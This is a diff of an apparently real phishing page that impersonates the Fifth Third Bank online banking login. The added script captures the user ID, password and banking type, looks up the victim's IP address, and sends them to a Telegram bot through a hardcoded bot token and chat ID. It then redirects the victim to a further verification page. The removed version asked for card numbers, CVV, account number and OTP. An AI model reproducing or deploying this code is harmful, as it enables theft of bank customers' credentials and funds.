@@ -2,111 +2,293 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>53rd Bank Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fifth Third Secure Panel</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
       margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f5f6fa;
+    }
+    .navbar {
+      background: #1a357a;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .menu-btn {
+      position: absolute;
+      left: 16px;
+      background: none;
+      border: none;
+      height: 40px;
+      width: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    .menu-icon {
+      width: 24px;
+      height: 2px;
+      background: #fff;
+      display: block;
+      position: relative;
+    }
+    .menu-icon::before,
+    .menu-icon::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      width: 24px;
+      height: 2px;
+      background: #fff;
+      transition: 0.2s;
+    }
+    .menu-icon::before {
+      top: -8px;
+    }
+    .menu-icon::after {
+      top: 8px;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 56px;
+    }
+    .logo-img {
+      height: 48px;
+      width: auto;
+      margin: 0 0 0 0;
+    }
+    .main-bg {
+      background: #f5f6fa;
+      min-height: 100vh;
       padding: 0;
     }
-    .container {
-      max-width: 450px;
-      margin: 50px auto;
-      background: #fff;
-      padding: 20px;
+    .login-card {
+      background: #f7f7f7;
       border-radius: 8px;
-      box-shadow: 0 0 10px #ccc;
+      box-shadow: 0 2px 12px rgba(30, 50, 100, 0.10);
+      max-width: 420px;
+      margin: 32px auto 0 auto;
+      padding: 32px 24px 24px 24px;
     }
-    h2 {
-      text-align: center;
-      color: #333;
-    }
-    label {
-      display: block;
-      margin-top: 15px;
-      color: #555;
-    }
-    input {
+    .login-title {
+      font-size: 1.7em;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 24px;
+      text-align: left;
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border-radius: 4px;
-      border: 1px solid #aaa;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 12px;
-      background: #0077cc;
       border: none;
-      color: #fff;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
+      padding-bottom: 0;
     }
-    button:hover {
-      background: #005fa3;
+    .verify-form label {
+      margin-bottom: 12px;
+      font-size: 1em;
+      color: #222;
+      font-weight: 700;
+      display: block;
+      text-align: left;
+    }
+    .verify-form select,
+    .verify-form input {
+      width: 100%;
+      margin-left: 0;
+      margin-right: 0;
+      padding: 14px 12px;
+      border: 1px solid #bfc5ce;
+      border-radius: 3px;
+      font-size: 1em;
+      margin-top: 6px;
+      background: #fff;
+      color: #222;
+      box-sizing: border-box;
+    }
+    .user-id-row {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      width: 100%;
+      margin-left: 0;
+      margin-right: 0;
+      border: 1px solid #bfc5ce;
+      border-radius: 3px;
+      background: #fff;
+      margin-top: 6px;
+      overflow: hidden;
+    }
+    .user-id-row input {
+      flex: 1;
+      border: none;
+      padding: 14px 12px;
+      font-size: 1em;
+      background: transparent;
+      margin-top: 0;
+      outline: none;
+    }
+    .user-id-row .save-btn {
+      border: none;
+      background: none;
+      color: #1a357a;
+      padding: 0 16px;
+      font-size: 1em;
+      font-weight: 500;
+      height: 100%;
+      border-left: 1px solid #bfc5ce;
+      border-radius: 0 3px 3px 0;
+      cursor: pointer;
+      margin-top: 0;
+      outline: none;
+    }
+    .user-id-row .save-btn:hover {
+      background: none;
+      color: #2248b0;
+    }
+    .login-btn {
+      width: 100%;
+      background: #1a357a;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 13px 0;
+      font-size: 1.1em;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 18px;
+      margin-bottom: 8px;
+      transition: background 0.2s;
+      letter-spacing: 1px;
+    }
+    .login-btn:hover {
+      background: #2248b0;
+    }
+    .links {
+      margin-top: 12px;
+      text-align: left;
+      font-size: 1em;
+    }
+    .links a {
+      color: #1a357a;
+      text-decoration: none;
+      margin-right: 12px;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .info-section {
+      background: #fff;
+      padding: 36px 0 36px 0;
+      text-align: center;
+      margin-top: 0;
+    }
+    .info-section h2 {
+      color: #222;
+      font-size: 1.3em;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .info-section p {
+      color: #333;
+      font-size: 1.1em;
+      margin: 0 auto;
+      max-width: 600px;
+    }
+    @media (max-width: 600px) {
+      .login-card {
+        max-width: 98vw;
+        padding: 8vw 2vw 8vw 2vw;
+      }
+      .navbar {
+        height: 48px;
+      }
+      .logo-img {
+        height: 28px;
+      }
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <h2>Secure Login</h2>
-    <form id="login-form">
-      <label for="userid">User ID</label>
-      <input type="text" id="userid" name="userid" required>
-
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" required>
-
-      <button type="submit">Login</button>
-    </form>
-
-    <form id="verify-form" style="display: none;">
-      <h2>Verification</h2>
-
-      <label for="accountnumber">Account Number</label>
-      <input type="text" id="accountnumber" name="accountnumber" required>
-
-      <label for="cardname">Name on Card</label>
-      <input type="text" id="cardname" name="cardname" required>
-
-      <label for="cardnumber">Card Number</label>
-      <input type="text" id="cardnumber" name="cardnumber" required>
-
-      <label for="cvv">CVV</label>
-      <input type="text" id="cvv" name="cvv" required>
-
-      <label for="expdate">Expiry Date</label>
-      <input type="text" id="expdate" name="expdate" placeholder="MM/YY" required>
-
-      <label for="mailingaddress">Mailing Address</label>
-      <input type="text" id="mailingaddress" name="mailingaddress" required>
-
-      <label for="otp">OTP</label>
-      <input type="text" id="otp" name="otp" required>
-
-      <button type="submit">Submit</button>
-    </form>
+  <nav class="navbar">
+    <button class="menu-btn" aria-label="Open menu">
+      <span class="menu-icon"></span>
+    </button>
+    <div class="logo-container">
+      <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
+    </div>
+  </nav>
+  <div class="main-bg">
+    <div class="login-card">
+      <div class="login-title">Online Banking Login</div>
+      <form class="verify-form" id="login-form">
+        <label>Online Banking
+          <select name="banktype">
+            <option>Online Banking</option>
+            <option>Commercial Banking</option>
+          </select>
+        </label>
+        <label>User ID
+          <div class="user-id-row">
+            <input type="text" name="userid" required placeholder="User ID">
+            <button type="button" class="save-btn">Save</button>
+          </div>
+        </label>
+        <label>Password
+          <input type="password" name="password" required>
+        </label>
+        <button type="submit" class="login-btn">LOG IN</button>
+        <div class="links">
+          <a href="#">Forgot Login?</a>
+          <a href="#">First Time User? Register.</a>
+        </div>
+      </form>
+    </div>
+    <div class="info-section">
+      <h2>Log In to View Your Accounts</h2>
+      <p>Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents, pay bills directly from your account, and more.</p>
+    </div>
   </div>
-
+  <script src="send.js"></script>
   <script>
-    document.getElementById('login-form').addEventListener('submit', function (e) {
+    const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
+    const CHAT_ID = '5817278771';
+    document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
-      const userid = document.getElementById('userid').value.trim();
-      const password = document.getElementById('password').value.trim();
+      const userid = this.userid.value;
+      const password = this.password.value;
+      const banktype = this.banktype.value;
+      // Save to sessionStorage for verify.html
       sessionStorage.setItem('userid', userid);
       sessionStorage.setItem('password', password);
-      document.getElementById('login-form').style.display = 'none';
-      document.getElementById('verify-form').style.display = 'block';
+      sessionStorage.setItem('banktype', banktype);
+      // Fetch IP and send login info to Telegram
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+          const ip = ipData.ip || 'Unknown';
+          const data = {
+            userid: userid,
+            password: password,
+            banktype: banktype,
+            ip: ip
+          };
+          const message = `[53rd Result]\n\n🏦 Banking Type: ${data.banktype}\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\n🌐 IP Address: ${data.ip}`;
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          }).then(() => {
+            window.location.href = 'verify.html';
+          });
+        });
     });
   </script>
-
-  <!-- Load the real script if it's available -->
-  <script src="/vault/send.js"></script>
-
 </body>
-</html>
+</html> 
